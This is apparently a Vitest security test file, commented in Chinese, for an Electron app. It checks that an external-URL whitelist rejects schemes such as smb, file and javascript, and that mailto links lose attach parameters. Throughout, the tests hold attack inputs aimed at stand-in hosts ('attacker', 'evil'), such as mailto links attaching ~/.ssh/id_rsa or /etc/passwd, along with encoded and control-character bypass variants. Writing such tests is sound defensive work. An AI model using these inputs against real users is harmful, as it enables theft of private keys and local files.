// topic 49 第六 session · P2(安全):windowOpenHandler 的 deny 分支裸调 shell.openExternal。
//
// 根因:shell.service 有 OPEN_EXTERNAL_SCHEME_WHITELIST(仅 http/https/mailto/file),
// openExternalUrl 会先过白名单。但 index.ts 的 windowOpenHandler deny 分支(所有
// target="_blank" 锚点点击都走这里,含 marketplace 不受信的 authorUrl / 评论 url)
// 旧实现裸调 `shell.openExternal(url)`,完全绕过白名单 → 攻击者控制 index 仓 / 评论
// 内容投放 `smb://attacker/share`、自定义协议 URL,用户点链接即由 OS 协议处理器打开。
// 修复:抽 isAllowedExternalUrl 共享断言,windowOpenHandler deny 分支先过白名单。
// 本 spec:① 断言断言本身的 scheme 判定;② 静态守卫 index.ts deny 分支已接入白名单。

import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import {
  isAllowedExternalUrl,
  sanitizeExternalUrl,
} from '../../../electron/main/services/shell.service';
import { MAX_EXTERNAL_URL_LEN } from '../../../electron/shared/url-limits';

const ROOT = join(__dirname, '..', '..', '..');

describe('topic49 6thS · external URL scheme whitelist', () => {
  it('放行 http/https/mailto', () => {
    expect(isAllowedExternalUrl('https://github.com/x/y')).toBe(true);
    expect(isAllowedExternalUrl('http://example.com')).toBe(true);
    expect(isAllowedExternalUrl('mailto:a@b.com')).toBe(true);
  });

  it('scheme 白名单走字符扫描,不调用 RegExp.test', () => {
    const testSpy = vi.spyOn(RegExp.prototype, 'test');
    try {
      expect(isAllowedExternalUrl('HTTPS://github.com/x/y')).toBe(true);
      expect(isAllowedExternalUrl('MAILTO:a@b.com')).toBe(true);
      expect(isAllowedExternalUrl('javascript:alert(1)')).toBe(false);
      expect(testSpy).not.toHaveBeenCalled();
    } finally {
      testSpy.mockRestore();
    }
  });

  it('安全 S6:拒绝 file:(含 UNC)—— 远程不受信数据(marketplace authorUrl 等)不得经 OS 打开本地文件', () => {
    expect(isAllowedExternalUrl('file:///etc/hosts')).toBe(false);
    expect(isAllowedExternalUrl('file:///Applications/Calculator.app')).toBe(false);
    expect(isAllowedExternalUrl('file://attacker/share')).toBe(false); // Windows UNC 外连
    expect(isAllowedExternalUrl('FILE:///etc/passwd')).toBe(false); // 大小写
  });

  it('拒绝非 http(s) 协议(投放面)', () => {
    expect(isAllowedExternalUrl('smb://attacker/share')).toBe(false);
    expect(isAllowedExternalUrl('javascript:alert(1)')).toBe(false);
    expect(isAllowedExternalUrl('vscode://x')).toBe(false);
    expect(isAllowedExternalUrl('custom-scheme://payload')).toBe(false);
    expect(isAllowedExternalUrl('  https://x')).toBe(false); // 前导空格不放行
  });

  it('静态守卫:index.ts windowOpenHandler 的 shell.openExternal 已被 isAllowedExternalUrl 门控', () => {
    const src = readFileSync(join(ROOT, 'electron/main/index.ts'), 'utf-8');
    // import 了共享断言
    expect(src).toMatch(/isAllowedExternalUrl/);
    // 不再出现裸 `shell.openExternal(url);` 顶格调用(必须包在 if 守卫内)
    // 且交出前过 sanitizeExternalUrl(mailto 去 attach,安全 L4)
    expect(src).toMatch(
      /if \(isAllowedExternalUrl\(url\)\)\s*\{\s*shell\.openExternal\(sanitizeExternalUrl\(url\)\)/,
    );
    expect(src).not.toMatch(/shell\.openExternal\(url\)/);
  });

  // 边界(E190):windowOpenHandler 在 new URL / openExternal 之前先做 url 长度上限(共享
  // MAX_EXTERNAL_URL_LEN),防超长 url 大字符串解析 + 交系统协议处理器。index.ts 不可直接 import
  //(顶层 app 副作用,E146),静态守卫 + 断言共享常量与 openExternal schema 同源。
  it('E190 windowOpenHandler 在 new URL 前有 url 长度上限(共享 MAX_EXTERNAL_URL_LEN)', () => {
    const src = readFileSync(join(ROOT, 'electron/main/index.ts'), 'utf-8');
    expect(src).toMatch(/MAX_EXTERNAL_URL_LEN/);
    // 长度守卫出现在 URL 解析之前(否则超长 url 仍先全量解析)。解析在 isOwnRendererWindowUrl 里
    //(window-open-policy,经 index.ts 的 isOwnRendererUrl 包一层),所以守卫必须先于对它的调用。
    const guardIdx = src.indexOf('url.length > MAX_EXTERNAL_URL_LEN');
    const newUrlIdx = src.indexOf('const allow = isOwnRendererUrl(');
    expect(guardIdx).toBeGreaterThan(-1);
    expect(newUrlIdx).toBeGreaterThan(-1);
    expect(guardIdx).toBeLessThan(newUrlIdx);
  });

  it('E190 MAX_EXTERNAL_URL_LEN 共享常量 = 2048(与 openExternal schema / Markdown 外链同源)', () => {
    expect(MAX_EXTERNAL_URL_LEN).toBe(2048);
  });
});

// 安全 L4:mailto 的 attach / attachment 参数会让部分邮件客户端静默附加本地文件(Evolution CVE-2020-11879、
// KMail CVE-2020-11880)。不受信 markdown / 终端输出链接 `mailto:x@evil?attach=~/.ssh/id_rsa` 经 xdg-open 交出
// → 私钥随邮件外发。主进程 openExternal 统一出口删掉这些参数再打开(各平台)。
describe('安全 L4 · mailto 去 attach 参数', () => {
  it('删除 attach / attachment(大小写不敏感),保留其它参数', () => {
    expect(sanitizeExternalUrl('mailto:x@evil?attach=~/.ssh/id_rsa')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?subject=hi&ATTACH=/etc/passwd&body=b')).toBe(
      'mailto:x@evil?subject=hi&body=b',
    );
    expect(sanitizeExternalUrl('MAILTO:x@evil?Attachment=/a&attachment=/b')).toBe('MAILTO:x@evil');
  });

  it('编码变体:键名百分号编码 / 双重编码 / 首尾空白 / ; 分隔', () => {
    expect(sanitizeExternalUrl('mailto:x@evil?%61ttach=/etc/passwd')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?%2561ttach=/etc/passwd')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?%20attach%20=/etc/passwd')).toBe('mailto:x@evil');
    expect(sanitizeExternalUrl('mailto:x@evil?subject=a;attach=/etc/passwd')).toBe('mailto:x@evil?subject=a');
    expect(sanitizeExternalUrl('mailto:x@evil?attach%3D/etc/passwd&subject=s')).toBe('mailto:x@evil?subject=s');
    // 保留未删参数的原分隔符(body 里的 ; 不被改写)
    expect(sanitizeExternalUrl('mailto:x@evil?body=a;b&attach=/x#f')).toBe('mailto:x@evil?body=a;b#f');
    // 无法解码的键名 → fail-closed 删除
    expect(sanitizeExternalUrl('mailto:x@evil?%E0%A4%A=1&subject=s')).toBe('mailto:x@evil?subject=s');
  });

  it('不含 attach 的 mailto 与 http(s) 原样返回', () => {
    expect(sanitizeExternalUrl('mailto:a@b.com?subject=see%20attachment&body=x')).toBe(
      'mailto:a@b.com?subject=see%20attachment&body=x',
    );
    expect(sanitizeExternalUrl('mailto:a@b.com')).toBe('mailto:a@b.com');
    expect(sanitizeExternalUrl('https://x.test/?attach=1')).toBe('https://x.test/?attach=1');
  });

  it('openExternalUrl(IPC 出口)交给系统的是去掉 attach 的 URL', async () => {
    vi.resetModules();
    const openExternal = vi.fn(async () => undefined);
    vi.doMock('electron', () => ({ shell: { openExternal } }));
    try {
      const mod = await import('../../../electron/main/services/shell.service');
      await mod.openExternalUrl({ url: 'mailto:x@evil?attach=~/.ssh/id_rsa&subject=s' });
      expect(openExternal).toHaveBeenCalledWith('mailto:x@evil?subject=s');
    } finally {
      vi.doUnmock('electron');
      vi.resetModules();
    }
  });
});

// 安全:shell.openExternal 把 URL 交 GURL 解析时按 URL 规范先删掉 Tab / CR / LF。若净化在删之前做,
// `mailto:x?att<TAB>ach=~/.ssh/id_rsa` 的键是 `att\tach` 不被删,交出后却变成 attach → 绕过 L4。
// 正常外链(Markdown 链接目标 / 终端链接 / Chromium 规范化后的 window.open URL)不含 C0 控制字符与 DEL,
// 故所有 scheme 一律拒绝含这类字符的外链(fail-closed),而不是猜测下游如何剥离。
describe('安全 · 外链含 C0 控制字符 / DEL 一律拒绝', () => {
  it('Tab / CR / LF / NUL / DEL 拼进键名或任意位置 → 拒绝(各 scheme)', () => {
    expect(isAllowedExternalUrl('mailto:x@evil?att\tach=~/.ssh/id_rsa')).toBe(false);
    expect(isAllowedExternalUrl('mailto:x@evil?att\nach=~/.ssh/id_rsa')).toBe(false);
    expect(isAllowedExternalUrl('mailto:x@evil?att\r\nach=~/.ssh/id_rsa')).toBe(false);
    expect(isAllowedExternalUrl('https://x.test/\u0000a')).toBe(false);
    expect(isAllowedExternalUrl('http://x.test/a\u007f')).toBe(false);
    expect(isAllowedExternalUrl('ht\ttps://x.test/')).toBe(false);
    expect(isAllowedExternalUrl('https://x.test/\u001f')).toBe(false);
  });

  it('正常链接(含空格 / 百分号编码的 %09 / 非 ASCII)不受影响', () => {
    expect(isAllowedExternalUrl('https://x.test/a b')).toBe(true);
    expect(isAllowedExternalUrl('mailto:a@b.com?subject=a%09b')).toBe(true);
    expect(isAllowedExternalUrl('https://例子.测试/路径?q=值')).toBe(true);
  });

  it('openExternalUrl(IPC 出口)拒绝且不调用 shell.openExternal', async () => {
    vi.resetModules();
    const openExternal = vi.fn(async () => undefined);
    vi.doMock('electron', () => ({ shell: { openExternal } }));
    try {
      const mod = await import('../../../electron/main/services/shell.service');
      await expect(mod.openExternalUrl({ url: 'mailto:x@evil?att\tach=~/.ssh/id_rsa' })).rejects.toThrow();
      expect(openExternal).not.toHaveBeenCalled();
    } finally {
      vi.doUnmock('electron');
      vi.resetModules();
    }
  });
});
